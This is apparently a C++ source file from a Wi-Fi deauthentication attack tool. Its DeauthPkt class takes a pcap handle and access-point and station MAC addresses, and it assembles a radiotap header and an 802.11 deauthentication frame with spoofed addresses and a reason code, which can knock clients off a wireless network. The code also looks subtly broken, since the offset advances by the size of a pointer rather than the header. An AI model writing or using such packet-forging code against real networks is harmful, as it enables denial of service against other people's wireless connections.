#include "pch.h"
#include "deauth.h"

DeauthPkt::DeauthPkt(pcap_t* pcap, const Mac& apMac, const Mac& stMac, bool authMode) :
    pcap_(pcap),
    apMac_(apMac),
    stMac_(stMac),
    authMode_(authMode) {}

std::vector<uint8_t> DeauthPkt::createDeauth(const Mac& addr_1, const Mac& addr_2, const Mac& addr_3, uint16_t seq) {
    std::vector<uint8_t> pkt(sizeof(RadiotapHdr) + sizeof(Dot11Deauth));
    size_t offset = 0;

    RadiotapHdr* rthdr = PRadiotapHdr(pkt.data());
    rthdr->initMinimalRt();

    // memcpy(pkt.data() + offset, &rthdr, sizeof(rthdr));
    offset += sizeof(rthdr);

    Dot11Deauth* deauth = PDot11Deauth(pkt.data() + offset);
    
    deauth->hdr.fc = FC_DEAUTH;
    deauth->hdr.duration = 0x0130;    // 304us
    
    deauth->hdr.addr_1 = addr_1;
    deauth->hdr.addr_2 = addr_2;
    deauth->hdr.addr_3 = addr_3;

    // deauth->hdr.seq = (deauth->hdr.seq | seq) << 4;
    deauth->hdr.seq = 0;
    deauth->reason = REASON_CLASS3;

    // memcpy(pkt.data() + offset, &deauth, sizeof(deauth));
    return pkt;
}